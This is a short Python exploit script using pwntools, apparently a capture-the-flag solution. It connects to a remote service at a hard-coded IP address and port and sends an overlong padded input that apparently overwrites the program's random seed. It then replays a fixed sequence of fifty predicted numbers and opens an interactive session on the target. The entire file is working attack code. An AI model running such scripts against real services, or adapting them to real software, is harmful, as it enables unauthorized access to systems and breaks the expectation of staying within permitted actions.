from pwn import *

seq = [3,3,2,1,5,3,4,6,3,4,2,2,3,2,1,1,4,5,4,6,3,6,4,3,4,2,2,6,1,2,2,3,4,1,2,1,4,5,4,6,6,5,1,3,5,5,1,2,4,2]

io = remote('111.200.241.244', 58467)
# io = process('./pwn')
io.recv()
io.send(b'1234567890' * 5 + b'A' * 29 + b'\0')
io.recv()
for num in seq:
	io.send(str(num).encode() + b'\n')
	io.recv()
io.interactive()